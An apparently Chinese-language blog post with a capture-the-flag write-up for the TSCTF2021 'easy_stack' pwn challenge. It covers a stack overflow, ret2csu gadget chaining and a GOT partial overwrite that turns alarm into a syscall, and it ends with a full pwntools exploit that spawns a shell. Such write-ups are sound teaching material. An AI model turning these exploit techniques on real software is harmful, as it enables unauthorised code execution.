@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mark0519.github.io","root":"/","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+  </script>
+
+  <meta name="description" content="TSCTF2021  pwn1 easy_stack0x00 PreTSCTF2021的pwn1，涉及到ret2csu的多次复用和一点点汇编以及syscall的知识">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TSCTF2021-easy_stack">
+<meta property="og:url" content="https://mark0519.github.io/2021/06/09/TSCTF2021-easy-stack/index.html">
+<meta property="og:site_name" content="mark0519的博客">
+<meta property="og:description" content="TSCTF2021  pwn1 easy_stack0x00 PreTSCTF2021的pwn1，涉及到ret2csu的多次复用和一点点汇编以及syscall的知识">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.imgdb.cn/item/60c068e6844ef46bb276adc9.png">
+<meta property="article:published_time" content="2021-06-09T05:55:09.000Z">
+<meta property="article:modified_time" content="2021-06-09T08:18:32.408Z">
+<meta property="article:author" content="mark0519">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="python2">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/60c068e6844ef46bb276adc9.png">
+
+
+<link rel="canonical" href="https://mark0519.github.io/2021/06/09/TSCTF2021-easy-stack/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>TSCTF2021-easy_stack | mark0519的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">mark0519的博客</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#TSCTF2021-pwn1-easy-stack"><span class="nav-number">1.</span> <span class="nav-text">TSCTF2021  pwn1 easy_stack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-Pre"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 Pre</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-IDA%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 IDA分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-exp"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 exp</span></a></li></ol></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">mark0519</p>
+  <div class="site-description" itemprop="description">我是mark0519，第一次玩博客的小萌新~</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mark0519" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mark0519" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:sunjiajun@bupt.edu.cn" title="E-Mail → mailto:sunjiajun@bupt.edu.cn" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2021/06/09/TSCTF2021-easy-stack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="mark0519">
+      <meta itemprop="description" content="我是mark0519，第一次玩博客的小萌新~">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mark0519的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          TSCTF2021-easy_stack
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-06-09 13:55:09 / 修改时间：16:18:32" itemprop="dateCreated datePublished" datetime="2021-06-09T13:55:09+08:00">2021-06-09</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="TSCTF2021-pwn1-easy-stack"><a href="#TSCTF2021-pwn1-easy-stack" class="headerlink" title="TSCTF2021  pwn1 easy_stack"></a>TSCTF2021  pwn1 easy_stack</h1><h2 id="0x00-Pre"><a href="#0x00-Pre" class="headerlink" title="0x00 Pre"></a>0x00 Pre</h2><p>TSCTF2021的pwn1，涉及到ret2csu的多次复用和一点点汇编以及syscall的知识</p>
+<a id="more"></a>
+
+<h2 id="0x01-IDA分析"><a href="#0x01-IDA分析" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h2><p>这题直接没给附件，只有ip，nc 连上去之后是一大段base64乱码，解码保存下是个xz压缩包，解压得到elf文件。</p>
+<p>main函数很短，明显的栈溢出。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">200</span>]; <span class="comment">// [rsp+0h] [rbp-D0h]</span></span><br><span class="line">  __int64 stack_data; <span class="comment">// [rsp+C8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0xA</span>u);</span><br><span class="line">  stack_data = <span class="number">0xDEADBEEFDEADBEEF</span>LL;</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x300</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( stack_1 != <span class="number">0xDEADBEEFDEADBEEF</span>LL )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>栈上布局也很简单：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-00000000000000D0 buf             db 200 dup(?)</span><br><span class="line">-0000000000000008 stack_data      dq ?</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br></pre></td></tr></table></figure>
+
+<p>即只需要在read的时候入读200+8+8个字节，其中覆盖stack_data的时候填入0xDEADBEEFDEADBEEF，就可以控制返回地址。</p>
+<p>没有其他函数可以利用，考虑使用 ret2csu</p>
+<h2 id="0x02-解题思路"><a href="#0x02-解题思路" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h2><p>由于需要利用ret2csu，我们先分析下csu段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400650                 mov     rdx, r15</span><br><span class="line">.text:0000000000400653                 mov     rsi, r14</span><br><span class="line">.text:0000000000400656                 mov     edi, r13d</span><br><span class="line">.text:0000000000400659                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span><br><span class="line">.text:000000000040065D                 add     rbx, 1</span><br><span class="line">.text:0000000000400661                 cmp     rbp, rbx</span><br><span class="line">.text:0000000000400664                 jnz     short loc_400650</span><br><span class="line">.text:0000000000400666</span><br><span class="line">.text:0000000000400666 loc_400666:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400666                 add     rsp, 8</span><br><span class="line">.text:000000000040066A                 pop     rbx</span><br><span class="line">.text:000000000040066B                 pop     rbp</span><br><span class="line">.text:000000000040066C                 pop     r12</span><br><span class="line">.text:000000000040066E                 pop     r13</span><br><span class="line">.text:0000000000400670                 pop     r14</span><br><span class="line">.text:0000000000400672                 pop     r15</span><br><span class="line">.text:0000000000400674                 retn</span><br></pre></td></tr></table></figure>
+
+<p>根据ret2csu，我们需要先调用 <code>0x0000000000400666 - 0x0000000000400674</code>来控制寄存器</p>
+<p>输入进寄存器的顺序为：pop rbx,rbp,r12,r13,r14,r15，</p>
+<p>之后调用```0x0000000000400650``,使rdx = r15 ; rsi = r14 ; edi = r13d ; call [r12+rbx*8]</p>
+<p>为了便于控制，我们令rbx = 0 使最后调用call r12 ，这样r12就是我们希望调用的函数。</p>
+<p>而64位程序的函数调用时参数依次放入 rdi, rsi, rdx, rcx, r8, r9 </p>
+<p>即我们利用csu时r13d为第一个参数（edi），r14，r15依次是第二个和第三个参数</p>
+<p>这样一个利用csu的大概思路就有了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">csu_end_addr = <span class="number">0x400666</span></span><br><span class="line">csu_front_addr = <span class="number">0x400650</span></span><br><span class="line">def csu(address, arg0, arg1, arg2):</span><br><span class="line">    <span class="meta"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="meta"># rbx should be 0,</span></span><br><span class="line">    <span class="meta"># rbp should be 1,enable not to jump</span></span><br><span class="line">    # r12 should be the function we want to call</span><br><span class="line">    <span class="meta"># rdi = edi = r13d =a rg0</span></span><br><span class="line">    <span class="meta"># rsi = r14 = arg1</span></span><br><span class="line">    <span class="meta"># rdx = r15 = arg2</span></span><br><span class="line">    ret = p64(csu_end_addr) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(address) + p64(arg0) +p64(arg1) + p64(arg2)</span><br><span class="line">    ret += p64(csu_front_addr)</span><br><span class="line">    ret += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure>
+
+<p>同时我们注意到main函数开头有个alarm函数，了解下alarm函数之后就能发现alarm函数是通过syscall实现的</p>
+<p>libc中的alarm：</p>
+<p><img src="https://pic.imgdb.cn/item/60c068e6844ef46bb276adc9.png"></p>
+<p>了解下plt和got机制就能 知道，函数掉用alarm是会先<code>call &lt;alarm@plt&gt;</code>,而在<code>&lt;alarm@plt&gt;</code>中会调用<code>&lt;alarm@got&gt;</code>,</p>
+<p>而got表中存放的地址就在libc中，这题我们没有write，没办法得到libc的基地址，但是原程序中的alarm调用会最终调用到libc中的alarm函数处，对libc中的alarm研究就能发现其实如果我们能使<code>&lt;alarm@got&gt;</code>中存放的alarm在libc中的真实地址+5 （即想我这里从原来的指向0x555555638610变成指向0x555555638615，具体数值由于开启了基地址随机保护会不定，但是alarm和syscall的最第三位是一定的）</p>
+<p>即我们不需要泄露alarm的got表，只需要直接修改alarm的got使其+5即可使调用alarm时调用syscall函数，</p>
+<p>syscall函数调用的时候系统调用号放在 rax 里，其中0x80为system，0x3b为execve。</p>
+<p>而read函数正好可以控制 rax 寄存器</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> * buf, <span class="keyword">size_t</span> count)</span></span>;</span><br><span class="line"><span class="comment">//read()函数尝试从文件描述符fd中读取count个字节到buf开头的缓冲区中。返回读取的字符数到rax</span></span><br></pre></td></tr></table></figure>
+
+<p>我们一般见到的都是read(0,buf,size),这里fd为0代表标准输入流</p>
+<p><strong>即从标准输入流中读取size个字节，将读取到的字符放入buf中，同时返回读取到的字节数到rax寄存器中</strong></p>
+<p>这里我们就可以利用read修改rax寄存器以放入系统调用号，顺便修改alarm的got表。</p>
+<p>现在我们可以构造payload了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0xDEADBEEFDEADBEEF</span>)*((<span class="number">200</span> +<span class="number">8</span>)/<span class="number">8</span>)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="comment"># p64()*(208/8)填满栈，再加一个p64()填充rbp</span></span><br><span class="line"><span class="comment"># 填入stack中使满足if条件满足且填充rbp，劫持ret</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload += csu(elf.got[<span class="string">&#x27;read&#x27;</span>], <span class="number">0</span>, elf.got[<span class="string">&#x27;alarm&#x27;</span>], <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 从标准输入流0中读取1个字节放到alarm的got表中，然后ret等待下一个调用函数</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload += csu(elf.got[<span class="string">&#x27;read&#x27;</span>], <span class="number">0</span>, bss_start, <span class="number">0x3b</span>)   <span class="comment"># return 0x3b ==&gt; rax</span></span><br><span class="line"><span class="comment"># 从标准输入流0中读取0x3b个字节放到.bss段中，然后ret等待下一个调用函数</span></span><br><span class="line"><span class="comment"># 这里选择read 0x3b个字节主要再能读取&quot;/bin/sh&quot;的前提下，使read的返回值为0x3b，read的返回值会放入rax中</span></span><br><span class="line"><span class="comment"># 而对syscall来说，调用syscall时要调用的函数的函数调用号就放在rax里，0x3b代表execve函数</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload += csu(elf.got[<span class="string">&quot;alarm&quot;</span>], bss_start, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># 调用got表中的alarm函数(实则会由read修改alarm的got表中的内容，这里调用alarm+5的syscall)</span></span><br><span class="line"><span class="comment"># 调用之后第一个参数为.bss段上的内容，接下来将会由第二个read往里写入&quot;/bin/sh&quot;，第二个和第三个参数为0</span></span><br><span class="line"><span class="comment"># 即最终调用execve(&quot;/bin/sh&quot;,0,0)来getshell</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = payload.ljust(<span class="number">0x300</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"><span class="comment"># 在main函数中的read读取0x300个字符，这我们在标准输入流中写满0x300个字符，之后这个read函数就会停止接收标准输入流</span></span><br><span class="line"><span class="comment"># 但由于我们的ret2csu，输入完这0x300个字符之后就开始调用我们注入的csu函数</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先调用read(0,elf.got[&#x27;alarm&#x27;],1),即输入一个字符写入alarm的got表</span></span><br><span class="line">payload += p8(<span class="number">0x15</span>) </span><br><span class="line"><span class="comment"># 在标准输入流中输入一个十六进制为0x15的字节，修改alarm的got表</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">附上我本地libc的alarm真实汇编代码</span></span><br><span class="line"><span class="string">0x555555638610 &lt;alarm&gt;   : mov eax，0x25</span></span><br><span class="line"><span class="string">0x555555638615 &lt;alarm+5&gt; : syscall</span></span><br><span class="line"><span class="string">即alarm的got表中的内容应为0x555555638610（后三位固定）</span></span><br><span class="line"><span class="string">我们只需要将最后改为0x555555638615，这样函数调用alarm的时候就会调用syscall，即往alarm的got表写入0x15</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上一个read调用完之后来到下一个csu函数</span></span><br><span class="line"><span class="comment"># read(0, bss_start, 0x3b)</span></span><br><span class="line"><span class="comment"># 在标准输入流中读取0x3b个字符，写入.bss段，故我们需要输入我们需要的&quot;/bin/sh&quot;字符串</span></span><br><span class="line">payload += <span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x3b</span>,<span class="string">&#x27;\x00&#x27;</span>) </span><br><span class="line"><span class="comment"># 这样bss段就会写入&quot;/bin/sh&quot;同时由于read返回输入的字节数，我们读入了0x3b个字节，rax寄存器就会被设置成0x3b</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 接着继续调用我们注入的csu函数，即elf.got[&#x27;alarm&#x27;]</span></span><br><span class="line"><span class="comment"># 而由于我们的修改alarm的got表指向syscall，此时调用syscall会调用rax寄存器里函数调用号所代表的函数</span></span><br><span class="line"><span class="comment"># 上一个read的返回值使rax此时的值为0x3b，在64位系统中代表execve</span></span><br><span class="line"><span class="comment"># 即此时调用execve(bss_start, 0, 0),由于我们往bss_start填入了&quot;/bin/sh&quot;</span></span><br><span class="line"><span class="comment"># 故最终调用execve(&quot;/bin/sh&quot;, 0, 0)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment"># getshell!</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">csu_end_addr = <span class="number">0x400666</span></span><br><span class="line">csu_front_addr = <span class="number">0x400650</span></span><br><span class="line">bss_start = <span class="number">0x601040</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">address, arg0, arg1, arg2</span>):</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r13d=arg0</span></span><br><span class="line">    <span class="comment"># rsi=r14=arg1</span></span><br><span class="line">    <span class="comment"># rdx=r15=arg2</span></span><br><span class="line">    ret = p64(csu_end_addr) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(address) + p64(arg0) +p64(arg1) + p64(arg2)</span><br><span class="line">    ret += p64(csu_front_addr)</span><br><span class="line">    ret += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0xDEADBEEFDEADBEEF</span>)*((<span class="number">200</span> +<span class="number">8</span>)/<span class="number">8</span>)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += csu(elf.got[<span class="string">&#x27;read&#x27;</span>], <span class="number">0</span>, elf.got[<span class="string">&#x27;alarm&#x27;</span>], <span class="number">1</span>)</span><br><span class="line">payload += csu(elf.got[<span class="string">&#x27;read&#x27;</span>], <span class="number">0</span>, bss_start, <span class="number">0x3b</span>)   <span class="comment"># return 0x3b ==&gt; rax</span></span><br><span class="line">payload += csu(elf.got[<span class="string">&quot;alarm&quot;</span>], bss_start, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x300</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p8(<span class="number">0x15</span>)</span><br><span class="line">payload += <span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x3b</span>,<span class="string">&#x27;\x00&#x27;</span>) </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>mark0519
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://mark0519.github.io/2021/06/09/TSCTF2021-easy-stack/" title="TSCTF2021-easy_stack">https://mark0519.github.io/2021/06/09/TSCTF2021-easy-stack/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/python2/" rel="tag"># python2</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/06/07/pwn-Off-by-Null/" rel="prev" title="pwn-Off_by_Null">
+                  <i class="fa fa-chevron-left"></i> pwn-Off_by_Null
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
